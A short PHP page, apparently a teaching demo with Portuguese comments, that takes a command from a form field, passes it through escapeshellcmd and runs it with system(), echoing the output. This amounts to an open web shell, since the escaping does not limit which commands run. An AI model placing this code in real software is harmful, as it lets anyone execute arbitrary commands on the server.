<meta charset="utf-8">
<?php
// Verificar se os dados estão vindo via post
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

	// escapar comandos vindos do cmd
	$cmd = escapeshellcmd($_POST['cmd']);

	var_dump($cmd);

	echo "<pre>";

	$comando = system($cmd, $retorno);

	echo "</pre>";
}
?>

<form method="POST">
	
	<input type="text" name="cmd">
	<button type="submit">Enviar</button>

</form>